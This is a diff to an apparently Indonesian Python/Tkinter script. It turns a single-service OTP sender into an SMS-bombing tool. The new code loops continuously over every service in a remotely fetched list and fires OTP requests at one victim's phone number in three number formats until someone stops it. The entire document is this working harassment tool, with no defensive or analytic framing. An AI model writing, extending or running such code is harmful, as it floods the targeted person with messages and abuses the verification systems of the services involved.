@@ -1,6 +1,8 @@
 import tkinter as tk
 import requests
 import json
+import time
+import threading
 
 # Fungsi untuk mengambil data dari URL
 def fetch_data():
@@ -12,36 +14,69 @@ def fetch_data():
         print("Failed to fetch data")
         return []
 
+# Fungsi untuk mengubah format nomor telepon
+def format_number(original_number, format_type):
+    if format_type == 'initial':
+        return '0' + original_number  # Format awal
+    elif format_type == 'international':
+        return '62' + original_number  # Format internasional
+    elif format_type == 'international_plus':
+        return '+62' + original_number  # Format internasional dengan +
+    return original_number
+
 # Fungsi untuk mengirim permintaan
-def send_request():
-    target_number = entry_number.get()
-    selected_service = service_var.get()
+def send_requests():
+    global is_running
+    target_number = entry_number.get().strip()
     
-    # Mencari data untuk layanan yang dipilih
-    service_data = next((item for item in services if item["name"] == selected_service), None)
-    
-    if service_data:
-        url = service_data["url"]
-        data = json.loads(service_data["data"].replace("target_number", target_number))
-        headers = service_data["headers"]
-        
-        # Mengirim permintaan POST
-        response = requests.post(url, headers=headers, json=data)
-        
-        # Menampilkan hasil
-        if response.status_code == 200:
-            result_label.config(text=f"OTP berhasil dikirim melalui {selected_service}!")
-        else:
-            result_label.config(text=f"Gagal mengirim OTP: {response.status_code} - {response.text}")
-    else:
-        result_label.config(text="Layanan tidak ditemukan.")
+    # Format nomor awal
+    formatted_numbers = [
+        format_number(target_number, 'initial'),
+        format_number(target_number, 'international'),
+        format_number(target_number, 'international_plus')
+    ]
+
+    while is_running:
+        for number in formatted_numbers:
+            for service in services:
+                service_data = {
+                    "url": service["url"],
+                    "data": json.loads(service["data"].replace("target_number", number)),
+                    "headers": service["headers"]
+                }
+                try:
+                    response = requests.post(service_data["url"], headers=service_data["headers"], json=service_data["data"])
+                    if response.status_code == 200:
+                        print(f"OTP berhasil dikirim ke {service['name']} untuk nomor {number}!")
+                    else:
+                        print(f"Gagal mengirim OTP ke {service['name']} untuk nomor {number}: {response.status_code} - {response.text}")
+                except Exception as e:
+                    print(f"Error saat mengirim ke {service['name']} untuk nomor {number}: {str(e)}")
+            
+            time.sleep(1)  # Delay antara pengiriman untuk menghindari spam
+
+        # Kembali ke format awal
+        entry_number.delete(0, tk.END)
+        entry_number.insert(0, target_number)
+
+# Fungsi untuk memulai pengiriman
+def start_sending():
+    global is_running
+    is_running = True
+    threading.Thread(target=send_requests).start()
+
+# Fungsi untuk menghentikan pengiriman
+def stop_sending():
+    global is_running
+    is_running = False
 
 # Mendapatkan data dari URL
 services = fetch_data()
+is_running = False
 
 # Membuat jendela utama
 root = tk.Tk()
-root.title("Pengirim OTP")
+root.title("Pengirim OTP ke Semua Layanan")
 
 # Membuat label dan entry untuk nomor telepon
 label_number = tk.Label(root, text="Masukkan Nomor Telepon:")
@@ -50,20 +85,13 @@ label_number.pack(pady=10)
 entry_number = tk.Entry(root)
 entry_number.pack(pady=10)
 
-# Membuat dropdown untuk memilih layanan
-service_var = tk.StringVar(root)
-service_var.set(services[0]["name"])  # Set default value
+# Tombol untuk memulai pengiriman
+start_button = tk.Button(root, text="Mulai Kirim OTP", command=start_sending)
+start_button.pack(pady=20)
 
-service_menu = tk.OptionMenu(root, service_var, *[service["name"] for service in services])
-service_menu.pack(pady=10)
-
-# Tombol untuk mengirim permintaan
-send_button = tk.Button(root, text="Kirim OTP", command=send_request)
-send_button.pack(pady=20)
-
-# Label untuk menampilkan hasil
-result_label = tk.Label(root, text="")
-result_label.pack(pady=10)
+# Tombol untuk menghentikan pengiriman
+stop_button = tk.Button(root, text="Stop Pengiriman", command=stop_sending)
+stop_button.pack(pady=20)
 
 # Menjalankan aplikasi
 root.mainloop()
